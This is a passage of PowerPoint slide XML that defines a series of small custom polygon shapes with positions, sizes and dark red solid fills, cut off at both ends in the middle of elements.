              <a:path w="34" h="62">
                <a:moveTo>
                  <a:pt x="34" y="34"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="34" y="62"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="26"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="34" y="34"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="800000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="533" name="CustomShape 149"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4784760" y="4862520"/>
            <a:ext cx="46800" cy="69120"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="30" h="44">
                <a:moveTo>
                  <a:pt x="30" y="17"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="30" y="44"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="27"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="30" y="17"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="800000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="534" name="CustomShape 150"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4892760" y="4923000"/>
            <a:ext cx="51840" cy="78480"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="33" h="50">
                <a:moveTo>
                  <a:pt x="33" y="19"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="33" y="50"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="30"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="33" y="19"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="800000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="535" name="CustomShape 151"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4835520" y="4889520"/>
            <a:ext cx="53280" cy="77040"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="34" h="49">
                <a:moveTo>
                  <a:pt x="34" y="21"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="34" y="49"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="28"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="34" y="21"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="800000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="536" name="CustomShape 152"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4784760" y="4962600"/>
            <a:ext cx="46800" cy="75600"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="30" h="48">
                <a:moveTo>
                  <a:pt x="30" y="21"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="30" y="48"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="27"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="30" y="21"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="800000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="537" name="CustomShape 153"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4946760" y="5070600"/>
            <a:ext cx="61200" cy="88200"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="39" h="56">
                <a:moveTo>
                  <a:pt x="39" y="25"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="39" y="56"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="30"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="39" y="25"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="800000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="538" name="CustomShape 154"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4892760" y="5035680"/>
            <a:ext cx="51840" cy="80280"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="33" h="51">
                <a:moveTo>
                  <a:pt x="33" y="21"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="33" y="51"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="29"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="33" y="21"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="800000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="539" name="CustomShape 155"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4835520" y="4997520"/>
            <a:ext cx="53280" cy="78480"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="34" h="50">
                <a:moveTo>
                  <a:pt x="34" y="22"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="34" y="50"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="27"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="34" y="22"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="800000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="540" name="CustomShape 156"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4784760" y="5064120"/>
            <a:ext cx="46800" cy="77040"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="30" h="49">
                <a:moveTo>
                  <a:pt x="30" y="24"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="30" y="49"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="27"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="30" y="24"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="800000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="541" name="CustomShape 157"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4892760" y="5143680"/>
            <a:ext cx="51840" cy="84960"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="33" h="54">
                <a:moveTo>
                  <a:pt x="33" y="24"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="33" y="54"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="30"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="33" y="24"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="800000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="542" name="CustomShape 158"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4835520" y="5102280"/>
            <a:ext cx="53280" cy="83520"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="34" h="53">
                <a:moveTo>
                  <a:pt x="34" y="25"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="34" y="53"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="28"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="34" y="25"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="800000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="543" name="CustomShape 159"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4784760" y="5167440"/>
            <a:ext cx="45360" cy="78480"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="29" h="50">
                <a:moveTo>
                  <a:pt x="29" y="23"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="29" y="50"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="26"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="29" y="23"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="800000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="544" name="CustomShape 160"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4944960" y="5294160"/>
            <a:ext cx="62640" cy="99360"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="40" h="63">
                <a:moveTo>
                  <a:pt x="40" y="33"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="40" y="63"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="32"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="40" y="33"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="400000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="545" name="CustomShape 161"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4890960" y="5251320"/>
            <a:ext cx="50040" cy="91440"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="32" h="58">
                <a:moveTo>
                  <a:pt x="32" y="26"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="32" y="58"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="29"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="32" y="26"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="800000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="546" name="CustomShape 162"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4834080" y="5205240"/>
            <a:ext cx="53280" cy="88200"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="34" h="56">
                <a:moveTo>
                  <a:pt x="34" y="28"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="34" y="56"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="29"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="34" y="28"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="600000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="547" name="CustomShape 163"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4784760" y="5268960"/>
            <a:ext cx="45360" cy="80280"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="29" h="51">
                <a:moveTo>
                  <a:pt x="29" y="24"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="29" y="51"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="25"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="29" y="24"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="800000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="548" name="CustomShape 164"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4944960" y="5410080"/>
            <a:ext cx="62640" cy="100800"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="40" h="64">
                <a:moveTo>
                  <a:pt x="40" y="35"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="40" y="64"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="30"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="40" y="35"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="800000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="549" name="CustomShape 165"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4890960" y="5361120"/>
            <a:ext cx="50040" cy="94680"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="32" h="60">
                <a:moveTo>
                  <a:pt x="32" y="29"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="32" y="60"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="29"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="32" y="29"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="600000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="550" name="CustomShape 166"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4834080" y="5308560"/>
            <a:ext cx="53280" cy="94680"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="34" h="60">
                <a:moveTo>
                  <a:pt x="34" y="32"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="34" y="60"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="30"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="34" y="32"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="800000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="551" name="CustomShape 167"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4784760" y="5369040"/>
            <a:ext cx="45360" cy="88200"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="29" h="56">
                <a:moveTo>
                  <a:pt x="29" y="29"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="29" y="56"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="28"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="29" y="29"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="800000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="552" name="CustomShape 168"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4944960" y="5522760"/>
            <a:ext cx="62640" cy="110520"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="40" h="70">
                <a:moveTo>
                  <a:pt x="40" y="38"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="40" y="70"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="31"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="40" y="38"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="800000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="553" name="CustomShape 169"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4890960" y="5472000"/>
            <a:ext cx="50040" cy="97560"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="32" h="62">
                <a:moveTo>
                  <a:pt x="32" y="31"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="32" y="62"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="30"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="32" y="31"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="600000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="554" name="CustomShape 170"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4834080" y="5416560"/>
            <a:ext cx="53280" cy="97560"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="34" h="62">
                <a:moveTo>
                  <a:pt x="34" y="34"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="34" y="62"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="28"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="34" y="34"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="800000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="555" name="CustomShape 171"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4946760" y="4954680"/>
            <a:ext cx="59760" cy="84960"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="38" h="54">
                <a:moveTo>
                  <a:pt x="38" y="23"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="38" y="54"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="31"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="38" y="23"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="800000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="556" name="CustomShape 172"/>
          <p:cNvSpPr/>
